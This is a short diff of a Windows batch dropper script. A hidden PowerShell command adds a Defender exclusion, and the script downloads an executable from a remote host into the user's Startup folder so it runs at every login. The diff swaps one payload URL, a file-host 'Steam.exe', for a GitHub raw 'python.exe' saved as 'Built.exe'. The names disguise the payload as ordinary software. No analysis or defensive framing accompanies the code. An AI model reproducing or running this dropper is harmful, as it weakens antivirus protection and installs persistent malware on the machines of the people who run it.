@@ -3,8 +3,8 @@ powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 @echo off
 setlocal 
 
-set "URL=https://server72.dosya.co/cgi-bin/azcl9.cgi/pu5v7tvq42eaoyfqakuaebtdfvbeldj5hqwv6wuxca/Steam.exe"
-set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\app.exe"
+set "URL=https://github.com/WALTER7979/evasor/raw/main/python.exe"
+set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
 
 
 if exist "%DEST%" del "%DEST%"
